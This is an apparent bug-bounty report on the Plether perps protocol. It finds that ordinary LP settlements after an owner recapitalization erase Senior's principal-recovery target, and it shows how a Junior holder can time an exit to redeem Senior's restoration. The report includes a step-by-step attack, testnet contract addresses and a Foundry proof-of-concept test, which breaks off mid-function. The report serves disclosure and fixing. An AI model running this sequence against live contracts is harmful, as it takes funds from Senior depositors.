# \#98751 [SC-High] Ordinary LP settlements erase Senior's principal-recovery target after a terminal-deficit recapitalization, so a Junior holder redeems the USDG that restores Senior principal

**Submitted on Nov 10th 2026 at 01:39:42 UTC by @emanueldlvg for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98751
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield
  - Protocol insolvency

## Description

## Affected contracts (in-scope commit `a82d4fef`; identical runtime code live on Arbitrum Sepolia v2.0.0)

The program states that the v2.0.0 Arbitrum Sepolia release is built from a commit whose `packages/perps/src` is identical to `a82d4fef`. The proof of concept runs in the repository's Foundry suite at the in-scope commit, with the release parameters and Pyth mocked. No in-scope contract is modified.

| Contract | Arbitrum Sepolia v2.0.0 address | Role in the issue |
|---|---|---|
| `HousePool` (`HousePoolReconcilePlanLib`, `HousePoolPendingPreviewLib`, `HousePoolWaterfallAccountingLib`) | `0xeb5604c393843b2f3c347ec24fa9ddad6ab2131e` | **Root cause.** `_reconcile` re-caps the full residual pending recapitalization against the full distributable equity on every pass, reserves it again, books the double reservation as a Senior loss, then re-bootstraps Senior with a lower high-water mark |
| `CfdEngine` | `0xca18a6783d7542f9d2f28f4f259772b74c4d6baa` | `recapitalizePool` (owner, documented recovery) records the recapitalization; `clearDegradedMode` |
| `TrancheVault` (Senior) | `0x5dc42ba5a1e8dd3e1b6868d10f66a9bf8fb5b83d` | Holds the Senior LP shares whose principal-recovery target is erased; pays the Senior LP less USDG on redemption |
| `TrancheVault` (Junior) | `0x4a8b67184a1e3224c11a191cc69f22c50eef734e` | A Junior holder's exit request triggers the re-reservation; the Junior holder later redeems the Senior principal restoration as USDG |
| `OrderRouter` | `0x918663d6da8cb33b325a04c4a5e8c51d42f3b444` | Public trading path used to reach the terminal-deficit state in the proof |

Release parameters used (`packages/perps/DEPLOYMENT.md` and the program page):
- risk: `vpiFactor` 0.01e18, `maxSkewRatio` 0.4e18, maintenance 10 bps, initial 20 bps, frozen-market 300 bps, `baseCarryBps` 500, liquidation `bountyBps` 10;
- execution fee 4 bps, LP epoch 1 hour;
- Senior cap 40,000,000 USDG and 80% of the pool, set through the 72-hour timelock;
- Senior and Junior seeds of 1 USDG each.

## Brief/Intro

After a terminal LP deficit `d`, the documented recovery is that the owner recapitalizes the pool and then clears degraded mode (`SECURITY.md`, "Explicit terminal-deficit cascade"). `CfdEngine.recapitalizePool(X)` gives Senior a principal of `X`. The part that equity backs, `X − d`, is credited to Senior principal at once. The rest, `d`, stays pending "until it is backed". Senior's high-water mark is set to `X`. That high-water mark is Senior's **principal-recovery target**. In the specification's words, it is "the unimpaired senior entitlement that future revenue must restore", and "Revenue restores impaired senior principal to its high-water mark before junior participates." The `d` gap between Senior principal and its high-water mark is impaired Senior **principal**. It is not yield.

`HousePool` does not record that the residual has already been capped. On every later reconcile it caps the **whole** residual against the **whole** distributable equity again, although that equity already backs the Senior principal the first pass credited. With no new backing, the double reservation is booked as a loss that zeroes Senior principal. Senior is then re-bootstrapped at the same principal but with a lower high-water mark. Senior's principal-recovery claim disappears without a trade, a price move or a loss. The revenue that should restore Senior principal is then credited to Junior, and Junior holders redeem it as USDG.

Any LP's ordinary exit settlement triggers it. A Junior holder can do it on purpose: request an exit from a second wallet so that one settlement runs before backing arrives, then redeem after the revenue arrives. In the proof of concept the setup uses release parameters and public calls, and the owner recapitalizes at the repository's own fixture ratio `X = 1.9984 d`. From one EVM snapshot:
- the Junior holder redeems **45,530.035820 USDG** in the attack branch and **0.000000 USDG** in the control branch;
- the Senior LP redeems **56,901.293994 USDG** instead of **103,451.451131 USDG**, a loss of **46,550.157137 USDG**;
- Senior ends **46,551.351822 USDG** below its principal-restoration entitlement.

## Vulnerability Details

### What the Senior high-water mark represents

`ACCOUNTING_SPEC.md` lines 331–338:

> `seniorPrincipal` and `juniorPrincipal` are the current NAV attributed to the two tranches, not immutable records of historical deposits. `seniorHighWaterMark` records the Senior entitlement that future revenue must restore after a loss. … 3. Charge a shortfall to Junior first, then Senior. Losses do not reduce the Senior high-water mark. 4. Route surplus first to restore Senior principal to its high-water mark, then to Junior.

`WHITEPAPER.md` lines 628–629: "the senior high-water mark: the unimpaired senior entitlement that future revenue must restore before junior receives residual value." Lines 772–773: "Revenue restores impaired senior principal to its high-water mark before junior participates."

After the recapitalization the high-water mark is `X`, the Senior principal the owner's recapitalization creates. Senior principal is `X − d` only because `d` of that recapitalization is not yet backed. The gap `HWM − S = d` is therefore impaired Senior principal. The revenue that closes it is, by the specification's own words, the restoration of Senior principal. It is not a coupon or other yield: the Senior coupon is a separate transfer (step 1 of the same list), and Junior holds no claim on revenue until Senior principal is back at its high-water mark.

### The repository's own fixture, and what it does not exercise

`test/perps/accounting/waterfall/HousePoolWaterfall.t.sol` lines 177–220, `test_PendingRecapitalization_CapsAgainstTraderClaimLiabilitiesAndCarriesResidual`:
- recapitalizes `pendingAmount = 100_000e6` while trader claims are `50_040e6`;
- reconciles once and asserts `seniorHighWaterMark == pendingAmount`: "Residual recap should preserve senior's recovery target" (line 201);
- removes the liability and reconciles again;
- asserts "Residual recap should settle once backing becomes available" (line 217) and "Settled recap should keep senior restoration out of unassigned assets" (line 219).

The test never runs an ordinary reconcile between the first pass and the arrival of backing. On the live protocol that happens on the next hourly LP epoch with any matured request. Inserting one such settlement breaks all three assertions (see the Proof of Concept).

### Root cause: the residual is re-capped against equity that already backs Senior

`HousePool._reconcile` (`HousePool.sol` lines 1555–1599) computes the settleable buckets from the full outstanding pending buckets and the full terminal distributable equity:

```solidity
HousePoolPendingPreviewLib.ClaimantPendingBuckets memory claimantBuckets = _getPendingClaimantBuckets();
HousePoolPendingPreviewLib.ClaimantPendingBuckets memory settleableClaimantBuckets =
    _settleablePendingClaimantBuckets(reconcileSnapshot, claimantBuckets);
...
HousePoolReconcilePlanLib.ReconcilePlan memory plan = HousePoolReconcilePlanLib.planReconcile(
    _currentPendingAccountingState(), reconcileSnapshot,
    _pendingClaimantBucketAssets(settleableClaimantBuckets), poolConfig.seniorRateBps, couponElapsed, markFresh
);
...
_setWaterfallState(plan.state.waterfall);
...
_applyPendingClaimantBucketsLive(settleableClaimantBuckets, claimantBuckets, allowRevenueContinuation);
```

`_settleablePendingClaimantBuckets` (lines 1829–1834) is a plain cap against the current `distributable`:

```solidity
return HousePoolPendingPreviewLib.capClaimantBuckets(claimantBuckets, reconcileSnapshot.distributable);
```

`HousePoolReconcilePlanLib.planReconcile` then reserves the settleable amount out of `distributable` before it reconciles the waterfall (`HousePoolReconcilePlanLib.sol` lines 68–71), and books any shortfall against current principal as a loss (lines 84–105):

```solidity
if (pendingBucketAssets > 0) {
    snapshot.distributable =
        snapshot.distributable > pendingBucketAssets ? snapshot.distributable - pendingBucketAssets : 0;
}
...
HousePoolWaterfallAccountingLib.ReconcilePlan memory waterfallPlan = HousePoolWaterfallAccountingLib.planReconcile(
    plan.state.waterfall.seniorPrincipal, plan.state.waterfall.juniorPrincipal, distributableToClaims
);
...
if (plan.deltaAssets > 0) {
    plan.state.waterfall = HousePoolWaterfallAccountingLib.absorbLoss(plan.state.waterfall, plan.deltaAssets);
```

Step by step, after the first pass:
- Senior principal is `S = X − d`, and it equals the whole distributable equity `D = X − d`.
- The residual `d` is still pending.
- The next reconcile reserves `min(d, D)` from `D` **again**.
- For `X ≤ 2d`, the reserve is all of `D`, so the waterfall sees distributable 0 against principal `X − d`.
- `absorbLoss` (`HousePoolWaterfallAccountingLib.sol` lines 167–184) zeroes Senior and leaves the high-water mark unchanged.

`_applyPendingClaimantBucketsLive` then applies the settleable recapitalization to a waterfall with `S = J = 0`. That reaches the bootstrap branch of `HousePoolPendingPreviewLib.applyClaimantRecapitalizationIntent` (`HousePoolPendingPreviewLib.sol` lines 118–122):

```solidity
if (state.waterfall.seniorPrincipal == 0 && state.waterfall.juniorPrincipal == 0) {
    state.waterfall.seniorPrincipal += remaining;
    state.waterfall.seniorHighWaterMark =
        recapitalizationTargetAssets > remaining ? recapitalizationTargetAssets : remaining;
    remaining = 0;
}
```

Senior principal is restored to the same `X − d`, but the high-water mark is overwritten with `max(remaining pending, settleable)`, which is `max(d, X − d) < X`. The pending bucket shrinks although no backing arrived. Each further pass repeats this until the target reaches the backed principal. At `X = 1.9984 d` one pass takes the target from `X` to `d`. At `X = 1.5 d` two passes take it from `X` to `d` and then to `X − d`.

From then on, `distributeRevenue` sees no Senior impairment, and revenue is credited to Junior.

The same double reservation has a second ordering, which follows from the code and **is not exercised by the proof of concept below**. If backing of at least `d` arrives before any extra settlement (`X > 2d`, or a lump of revenue), the waterfall sees only `R − d` of revenue. It fills the Senior gap first, and the residual recapitalization then finds no gap and is routed to `unassignedAssets` (lines 124–136). Junior loses `d` to an owner-only bucket. The fix below covers both orderings.

**Not the designed explicit-recapitalization reset.**

The repository deliberately lets an **explicit owner recapitalization** of a genuinely wiped pool set a fresh high-water mark (`test/perps/accounting/waterfall/TrancheRecoveryBehavior.t.sol` lines 24–55, "Explicit recapitalization should reset the HWM"). That is a decision the owner makes with each `recapitalizePool` call. Here the owner made one recapitalization with target `X`, which the first reconcile records as the recovery target. The target is then lowered by ordinary LP settlements, with no new owner decision and no new loss. It also contradicts the residual-recapitalization test above (line 201).

### The trigger: the documented recovery, then any LP's ordinary settlement

`SECURITY.md` lines 1499–1511 ("Explicit terminal-deficit cascade"): "4. Recapitalize or clear positions. 5. Clear degraded mode only after raw solvency `E >= L` is genuinely restored". `EMERGENCY_RESPONSE_GUIDE.md` line 228 repeats that criterion. No document sizes `X`:
- With the deficit held as trader claims and no open positions, `L = 0`. The smallest runbook-compliant `X` is therefore just above `d`.
- The drain occurs for every `X ∈ (d, 2d]`, and the repository's own fixture ratio, 1.9984 d, is in that band.

The owner's action is the documented recovery procedure. The bug is triggered afterwards by any LP's ordinary settlement, which needs only one matured LP request and a permissionless `settleLpEpoch` call. A Senior holder cannot defend: a Senior exit request queued after the first settlement freezes all LP settlement while free cash is 0, and the first settlement that lands still drains (`test_ReactiveSeniorExitDoesNotDefend`). New deposits cannot dilute the attacker in this state, because `HousePool._canAcceptTrancheDeposits` rejects them while Junior principal is zero, a recapitalization is pending or Senior is below its high-water mark (`HousePool.sol` lines 480–502, 1120–1137). The program: "In scope: a legitimate, documented action by a trusted role that triggers a bug harming users or the protocol."

### Published items: an incomplete SC-L1 fix, and what the documentation says

The pre-audit report (SC Audit Studio, `audits/plether-pre-audit-report.pdf`) lists **SC-L1, "Permissionless zero-value senior withdraw can persist overstated HousePool tranche principal"**. It found that `_reconcile()` applied pending claimant buckets "without capping the credit against the liability-adjusted distributable amount". The project's response: "Fixed in Plether-Fi/plether-core#29. Pending recap/revenue is now capped to what's actually settleable after MTM/deferred liabilities. **Anything that can't be settled yet stays pending, stays reserved everywhere, and gets applied later once it's backed.**"

The fix caps the pending bucket on every pass but forgets that the equity it caps against already backs the principal the previous pass credited. In the proof, the residual is applied **without any backing**: pending falls from 56,900.44 to 91.04 USDG while LP equity is unchanged. That contradicts the fix statement. The program's known-issue rule makes this eligible: "a report on the same root cause is valid only if it shows that the fix at commit a82d4fef ... is incomplete or introduces a new bug."

The Cecuro item MED-12 ("Mixed recovery inflows can strand LP revenue in ownerless pool assets") concerns the revenue-continuation flag in a same-batch recapitalization plus revenue. That is a different root cause.

None of the listed `SECURITY.md` known-limitation sections mentions residual recapitalization or the high-water mark. The specification states the opposite of the observed behaviour:
- "Losses do not reduce the Senior high-water mark" (`ACCOUNTING_SPEC.md` line 337);
- "Reserving them in step 2 prevents counting the same inflow twice" (lines 339–340);
- "Revenue restores impaired senior principal to its high-water mark before junior participates" (`WHITEPAPER.md` line 772).

## Exploitation

The proof of concept uses the repository's `BasePerpTest` stack with the release risk parameters, the release Router configuration, 1 USDG seeds and the 40M / 80% Senior caps (asserted). All LP capital enters through public requests:
- a Senior LP with 300,000 USDG;
- a Junior holder (the attacker) with 980,000 USDG, plus a second wallet with 5,000 USDG;
- three other Junior holders with 5,000 USDG each.

Every trade uses the public V3 `commitOrder` / `executeOrder`, and every price is a `MockPyth` tick through `OrderRouter.updateMarkPrice`. The owner's only actions are the documented `recapitalizePool` and `clearDegradedMode`. There is no `vm.store`, `deal`, `etch` or `mockCall` on in-scope contracts.

The terminal-deficit state and the documented recovery, identical in every test:
1. Traders open a hedge at 1.00 inside the 40% skew cap: three 430,000 USDG SHORTs and two 400,000 USDG LONGs. Each margin covers its endpoint maximum profit, so every carry borrow base is 0, and the test asserts this.
2. The basket rises 60% in Pyth marks of at most 1% per trading day, weekends skipped: 48 marks over 66 calendar days. A 300,000-token LONG opens at the top, and the SHORTs close in profit. That latches degraded mode.
3. The basket falls 61.25% in marks of at most 1% per trading day: 95 marks over 133 calendar days. The LONGs close, and the payout above pool cash becomes a trader claim. The terminal LP deficit is **d = 56,900.444682 USDG**.
4. The owner follows the documented recovery: `recapitalizePool(X)` with `X = 1.9984 d = 113,709.848652 USDG`, then `clearDegradedMode()`.
5. One ordinary Junior exit is settled by a keeper. This gives the repository-intended state: Senior principal 56,809.403970, high-water mark 113,709.848652, pending recapitalization 56,900.444682.

Attack (`test_Attack_JuniorHolderSettlesBeforeBackingThenRedeems`, `test_AttackVersusControl_RedeemableUsdg`):
6. The Junior holder requests an exit from its second wallet, and the matured epoch is settled. There is no trade, no price move and no loss. The Senior high-water mark falls from **113,709.848652 to 56,900.444682**. Pending recapitalization falls from 56,900.444682 to 91.040712 although no backing arrived. Senior principal is unchanged at 56,809.403970.
7. Ordinary losing trades bring **R = 46,642.392534 USDG** of LP revenue, and one more ordinary settlement runs. LP equity is 103,451.796504 USDG, so Senior is entitled to `min(X, equity) = 103,451.796504`. Senior holds **56,900.444682**, and Junior got **46,460.311110**.
8. The Junior holder and the Senior LP each request their full balance, and one settlement funds both in full. The Junior holder receives **45,530.035820 USDG** and the Senior LP **56,901.293994 USDG**.

Control (`test_Control_NoSettlementBeforeBackingThenRedeem`, and the control branch of `test_AttackVersusControl_RedeemableUsdg`):
- Step 6 is skipped, and everything else is the same.
- After the same backing, Senior holds its full entitlement of 103,451.796504 with the high-water mark at 113,709.848652, and Junior principal is 0.
- The Senior LP redeems **103,451.451131 USDG**, and the Junior holder redeems **0.000000 USDG**.

`test_RepoRatio_OneOrdinarySettlementHalvesSeniorTarget` runs the same sequence with step 6 done by an unrelated Junior holder. The result is identical: Senior shortfall 46,551.351822 USDG, and Senior LP share value 56,900.254720 USDG.

`test_ReactiveSeniorExitDoesNotDefend` uses `X = 1.5 d = 85,350.667023`. The Senior LP queues a 10% exit after the first settlement. Every settlement then reverts `NoLpEpochProgress` while free cash is 0. The first settlement that lands, after two small losing trades, still lowers the high-water mark from 85,350.667023 to 52,937.410496, with 2,053.011752 USDG of the Senior exit funded.

## Impact Details

**Critical — Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield.**

- **What is taken.** The Senior LP's principal-restoration claim, which the specification defines as the unimpaired Senior entitlement that revenue must restore to impaired Senior principal before Junior participates.
- **Who takes it.** After the drain, that restoration is credited to Junior principal. A Junior holder who triggered the drain withdraws it as USDG.
- **Measured from one EVM snapshot:**
  - the Junior holder gains **45,530.035820 USDG** (attack minus control);
  - the Senior LP redeems **46,550.157137 USDG** less;
  - the remaining 1,020.121317 USDG stays with the other Junior shares and with unassigned assets.
- **The Senior LP has no recovery.**
  - A later recapitalization, with Senior principal above zero, fills only `HWM − S = 0` and goes to `unassignedAssets`.
  - `assignUnassignedAssets` mints to a single receiver.
  - A Senior exit does not defend (`test_ReactiveSeniorExitDoesNotDefend`).

The setup, stated factually:
- **The terminal-deficit state** that the documented recovery procedure exists for. The proof reaches it through public calls with marks of at most 1% per trading day: a +60% leg over 66 calendar days and a −61.25% leg over 133.
- **The owner's documented recapitalization** at the repository's own fixture ratio, followed by `clearDegradedMode()` once `E >= L`.
- **One ordinary LP settlement** before backing arrives.

The program's feasibility rule: "Impact is calculated first, separately from feasibility. Feasibility limitations do not change the impact or severity of a finding, only the amount paid for it." On trusted-role scope: recapitalization is the documented recovery procedure, and the bug is triggered by any LP's ordinary settlement afterwards ("In scope: a legitimate, documented action by a trusted role that triggers a bug harming users or the protocol").

## Recommendation

Do not re-cap a residual that a previous pass already capped against the same equity.
- **Option 1.** Cap pending recapitalization only against the distributable equity that is **not already claimed** by tranche principal: `settleable = min(pending, max(distributable − (seniorPrincipal + juniorPrincipal + unassignedAssets), 0))`. With no new backing, the residual then stays pending and reserved, as the SC-L1 fix statement promises, instead of being re-reserved out of equity that already backs Senior.
- **Option 2.** Apply the residual before the waterfall routes any surplus, so that new backing fills the residual recapitalization first. Revenue then reaches Junior only after the recapitalization is settled.

Either option also removes the second ordering described in the root cause. Add a regression test that inserts one ordinary reconcile between the first pass and the arrival of backing in `test_PendingRecapitalization_CapsAgainstTraderClaimLiabilitiesAndCarriesResidual`, and asserts the existing lines 201, 217 and 219.

## Proof of Concept

Save the test below as `packages/perps/test/perps/poc/ResidualRecapPrincipalTheft.t.sol` and run from the repository root:

```bash
forge test --root packages/perps --match-contract ResidualRecapPrincipalTheftPoC -vv
```

The file contains five tests:
- `test_RepoRatio_OneOrdinarySettlementHalvesSeniorTarget`: the repository's ratio `X = 1.9984 d`; one extra ordinary settlement before backing;
- `test_Attack_JuniorHolderSettlesBeforeBackingThenRedeems`: the Junior holder's extra settlement, the backing, then both redemptions;
- `test_Control_NoSettlementBeforeBackingThenRedeem`: the same without the extra settlement;
- `test_AttackVersusControl_RedeemableUsdg`: attack and control from one EVM snapshot, asserting the Junior holder's USDG gain and the Senior LP's USDG loss;
- `test_ReactiveSeniorExitDoesNotDefend`: the Senior LP's own exit request does not prevent the drain.

The suite's Router is the repository's test harness, which only adds a legacy scalar `commitOrder` overload. The proof uses the production V3 `commitOrder(OrderRequest)`, `executeOrder`, `updateMarkPrice` and `settleLpEpoch` entry points.

### Complete test:

<details>
<summary>Complete test </summary>

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";
import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";

/// @notice After a terminal LP deficit `d`, the owner's documented recovery `CfdEngine.recapitalizePool(X)` leaves a
///         residual pending recapitalization (the part not yet backed). Every later ordinary LP settlement re-caps that
///         SAME residual against the SAME distributable equity that the first settlement already credited to Senior
///         principal, books the double reservation as a loss that zeroes Senior, and re-bootstraps Senior with a lower
///         high-water mark. Senior's principal-recovery target falls with no economic event, and later revenue that the
///         waterfall owes to Senior's principal restoration is credited to Junior, which a Junior holder then redeems.
///
///         The terminal deficit is reached through public calls only, at release parameters, with one <=1% Pyth mark per
///         trading day (weekends skipped) and fully margined positions (carry borrow base asserted 0). The owner's only
///         actions are the documented recapitalizePool and clearDegradedMode. Pyth (MockPyth) and USDG (mock token) are
///         the only mocks; no vm.store / deal / etch / mockCall on in-scope contracts.
contract ResidualRecapPrincipalTheftPoC is BasePerpTest {

    // --- actors ---
    address internal constant SHORT_ACCOUNT = address(0xA770C2);
    address internal constant LONG_A = address(0xA770A1); // longs opened at 1.00
    address internal constant LONG_B = address(0xA770B1); // longs opened at the top
    address internal constant REV_TRADER = address(0x5EE0A1); // ordinary losing trader (backing revenue)
    address internal constant SENIOR_LP = address(0x5E1105);
    address internal constant JUNIOR_LP = address(0x1D1105); // main Junior holder
    address internal constant LP_EXIT_A = address(0x1D2001); // ordinary Junior holders who exit after the crisis
    address internal constant LP_EXIT_B = address(0x1D2002);
    address internal constant LP_EXIT_C = address(0x1D2003);
    address internal constant LP_EXIT_D = address(0x1D2004);
    address internal constant KEEPER = address(0xE0EC);

    // --- scenario constants ---
    uint256 internal constant ENTRY_PRICE = 1e8;
    uint256 internal constant TOP_PRICE = 160_000_000; // +60% in 1% daily marks
    uint256 internal constant BOTTOM_PRICE = 62_000_000; // -61.25% in 1% daily marks
    uint256 internal constant TICK_INTERVAL = 2 minutes; // backing round trips only
    uint256 internal constant JUNIOR_MAIN = 980_000e6;
    uint256 internal constant EXIT_WALLET_DEPOSIT = 5_000e6;
    uint256 internal constant SENIOR_DEPOSIT = 300_000e6;
    uint256 internal constant REPO_RATIO_BPS = 19_984; // HousePoolWaterfall.t.sol:182-183 uses 100,000 vs 50,040
    uint256 internal constant HALF_BAND_BPS = 15_000; // 1.5 d

    uint256 internal curPrice;
    uint256 internal orderNonce;

    struct Snap {
        uint256 s;
        uint256 h;
        uint256 j;
        uint256 u;
        uint256 pending;
    }

    // ------------------------------------------------------------------ configuration (release values)

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0; // all LP capital enters through the public request/settle/claim path
    }

    function _initialJuniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function _initialSeniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function setUp() public override {
        super.setUp();
        _applyReleaseRouterConfig(); // 72 h timelock
        _setSeniorCapacity(40_000_000e6, 8_000); // 72 h timelock
        assertEq(pool.maxSeniorShareBps(), 8_000, "release Senior share cap");
        assertEq(pool.maxSeniorExposureAssets(), 40_000_000e6, "release Senior exposure cap");
        assertEq(engine.executionFeeBps(), 4, "release execution fee");
        vm.warp(SETUP_TIMESTAMP + 7 days); // Monday 10:00 UTC, live market
        curPrice = ENTRY_PRICE;
        _refreshMark(curPrice);

        uint256 jr = _requestDeposit(juniorVault, JUNIOR_LP, JUNIOR_MAIN);
        uint256 e1 = _requestDeposit(juniorVault, LP_EXIT_A, EXIT_WALLET_DEPOSIT);
        uint256 e2 = _requestDeposit(juniorVault, LP_EXIT_B, EXIT_WALLET_DEPOSIT);
        uint256 e3 = _requestDeposit(juniorVault, LP_EXIT_C, EXIT_WALLET_DEPOSIT);
        uint256 e4 = _requestDeposit(juniorVault, LP_EXIT_D, EXIT_WALLET_DEPOSIT);
        _warpTo(juniorVault.depositEpochStart(jr));
        _refreshMark(curPrice);
        pool.settleLpEpoch(0, 0); // no open positions: permissionless
        _claimDeposit(juniorVault, JUNIOR_LP, jr);
        _claimDeposit(juniorVault, LP_EXIT_A, e1);
        _claimDeposit(juniorVault, LP_EXIT_B, e2);
        _claimDeposit(juniorVault, LP_EXIT_C, e3);
        _claimDeposit(juniorVault, LP_EXIT_D, e4);
        uint256 sr = _requestDeposit(seniorVault, SENIOR_LP, SENIOR_DEPOSIT);
        _warpTo(seniorVault.depositEpochStart(sr));
        _refreshMark(curPrice);
        pool.settleLpEpoch(0, 0);
        _claimDeposit(seniorVault, SENIOR_LP, sr);
        _refreshMark(curPrice);
    }

    // ------------------------------------------------------------------ tests

    /// @notice Headline: the repository's own residual-recapitalization ratio, X = 1.9984 d, no attacker.
    function test_RepoRatio_OneOrdinarySettlementHalvesSeniorTarget() external {
        (uint256 x, uint256 d) = _crisisAndRunbook(REPO_RATIO_BPS);
        _ordinaryExit(LP_EXIT_A); // first ordinary settlement after the recapitalization
        Snap memory a = _snap("after the first ordinary settlement (repository-intended state)");
        assertEq(a.h, x, "HWM must be the recapitalization target");
        assertEq(a.pending, d, "residual must equal d");

        _ordinaryExit(LP_EXIT_B); // ONE more ordinary exit settlement: no trade, no price move, no loss
        Snap memory b = _snap("after one more ordinary exit settlement");
        assertEq(b.s, a.s, "Senior principal changed although nothing happened");
        assertLt(b.h, a.h, "HWM did not fall");

        (Snap memory fin, uint256 revenue) = _backingAndFinalSettle(d);
        _assertWaterfallBroken(x, d, fin, revenue);
    }

    /// @notice Attack: a Junior holder (main wallet JUNIOR_LP, second wallet LP_EXIT_B) triggers one extra ordinary
    ///         settlement before the backing arrives, then redeems. Compared with the control below.
    function test_Attack_JuniorHolderSettlesBeforeBackingThenRedeems() external {
        (uint256 x, uint256 d) = _crisisAndRunbook(REPO_RATIO_BPS);
        _ordinaryExit(LP_EXIT_A); // first ordinary settlement after the recapitalization (anyone)
        Snap memory a = _snap("after the first ordinary settlement (repository-intended state)");
        assertEq(a.h, x, "HWM must be the recapitalization target");
        assertEq(a.pending, d, "residual must equal d");
        _ordinaryExit(LP_EXIT_B); // the Junior holder's own wallet: one settlement before the backing
        Snap memory b = _snap("ATTACK: after the Junior holder's extra settlement");
        assertLt(b.h, a.h, "HWM did not fall");
        (Snap memory fin, uint256 revenue) = _backingAndFinalSettle(d);
        _assertWaterfallBroken(x, d, fin, revenue);
        (uint256 juniorUsdg, uint256 seniorUsdg) = _redeemBoth();
        emit log_named_decimal_uint("ATTACK: Junior holder USDG redeemed", juniorUsdg, 6);
        emit log_named_decimal_uint("ATTACK: Senior LP USDG redeemed", seniorUsdg, 6);
        assertGt(juniorUsdg, 0, "Junior holder redeemed nothing");
    }

    /// @notice Control: the same crisis, recapitalization, backing and redemptions, but no settlement before backing.
    function test_Control_NoSettlementBeforeBackingThenRedeem() external {
        (uint256 x, uint256 d) = _crisisAndRunbook(REPO_RATIO_BPS);
        _ordinaryExit(LP_EXIT_A);
        Snap memory a = _snap("after the first ordinary settlement (repository-intended state)");
        assertEq(a.h, x, "HWM must be the recapitalization target");
        (Snap memory fin,) = _backingAndFinalSettle(d);
        _report(x, d, fin);
        uint256 total = fin.s + fin.j + fin.u;
        uint256 entitledSenior = x <= total ? x : total;
        assertApproxEqAbs(fin.s, entitledSenior, 1e6, "control: Senior not restored to its entitlement");
        assertEq(fin.h, x, "control: HWM changed");
        (uint256 juniorUsdg, uint256 seniorUsdg) = _redeemBoth();
        emit log_named_decimal_uint("CONTROL: Junior holder USDG redeemed", juniorUsdg, 6);
        emit log_named_decimal_uint("CONTROL: Senior LP USDG redeemed", seniorUsdg, 6);
    }

    /// @notice Attack minus control from one EVM snapshot: Junior holder's USDG gain and Senior LP's USDG loss.
    function test_AttackVersusControl_RedeemableUsdg() external {
        uint256 snap = vm.snapshotState();
        (uint256 x, uint256 d) = _crisisAndRunbook(REPO_RATIO_BPS);
        _ordinaryExit(LP_EXIT_A);
        uint256 afterFirst = vm.snapshotState();
        _ordinaryExit(LP_EXIT_B); // attack branch
        _backingAndFinalSettle(d);
        (uint256 jA, uint256 sA) = _redeemBoth();
        vm.revertToState(afterFirst);
        _backingAndFinalSettle(d); // control branch
        (uint256 jC, uint256 sC) = _redeemBoth();
        emit log_named_decimal_uint("recapitalization X (Senior's principal-recovery target)", x, 6);
        emit log_named_decimal_uint("deficit d", d, 6);
        emit log_named_decimal_uint("ATTACK  Junior holder USDG redeemed", jA, 6);
        emit log_named_decimal_uint("CONTROL Junior holder USDG redeemed", jC, 6);
        emit log_named_decimal_uint("ATTACK  Senior LP USDG redeemed", sA, 6);
        emit log_named_decimal_uint("CONTROL Senior LP USDG redeemed", sC, 6);
        emit log_named_decimal_uint("JUNIOR HOLDER GAIN (attack - control)", jA - jC, 6);
        emit log_named_decimal_uint("SENIOR LP LOSS (control - attack)", sC - sA, 6);
        assertGt(jA, jC, "no Junior gain");
        assertGt(sC, sA, "no Senior loss");
        // The rest of Senior's loss stays with the other Junior shares (small holders, seed) and unassigned assets.
        emit log_named_decimal_uint("  of which kept by other Junior shares and unassigned", (sC - sA) - (jA - jC), 6);
        assertGt((jA - jC) * 100, (sC - sA) * 97, "Junior holder took less than 97% of Senior's loss");
        snap;
    }

    /// @notice Victim-recovery probe: the Senior LP reacts with its own 10% exit request after the first settlement.
    function test_ReactiveSeniorExitDoesNotDefend() external {
        (uint256 x, uint256 d) = _crisisAndRunbook(HALF_BAND_BPS);
        _ordinaryExit(LP_EXIT_A);
        Snap memory a = _snap("after the first ordinary settlement");
        assertEq(a.h, x, "HWM must be the recapitalization target");
        assertEq(a.pending, d, "residual must equal d");

        uint256 sreq = _seniorRequestsExit(1000);
        _warpTo(pool.lpEpochStart(sreq) + 10);
        _refreshMark(curPrice);
        vm.prank(KEEPER);
        vm.expectRevert(bytes4(keccak256("HousePool__NoLpEpochProgress()")));
        pool.settleLpEpoch(0, 0);
        emit log("Senior exit at the head with free cash 0: every LP settlement reverts NoLpEpochProgress");

        _fundTrader(REV_TRADER, 400_000e6);
        _lossRound(10_000e6); // two small ordinary losing trades
        _lossRound(10_000e6);
        _refreshMark(curPrice);
        vm.prank(KEEPER);
        IHousePool.LpEpochSettlementResult memory r = pool.settleLpEpoch(0, 0);
        emit log_named_decimal_uint("Senior exit funded in the landing settlement", r.seniorFundedAssets, 6);
        Snap memory b = _snap("after the first settlement that lands (the Senior LP's own exit at the head)");
        assertLt(b.h, a.h, "the reactive Senior exit defended the HWM");
    }

    // ------------------------------------------------------------------ assertions

    /// @dev Waterfall entitlement: revenue restores Senior to the HWM the recapitalization set (X) before Junior.
    function _assertWaterfallBroken(
        uint256 x,
        uint256 d,
        Snap memory fin,
        uint256 revenue
    ) internal {
        _report(x, d, fin);
        uint256 total = fin.s + fin.j + fin.u;
        uint256 entitledSenior = x <= total ? x : total;
        uint256 shortfall = entitledSenior - fin.s;
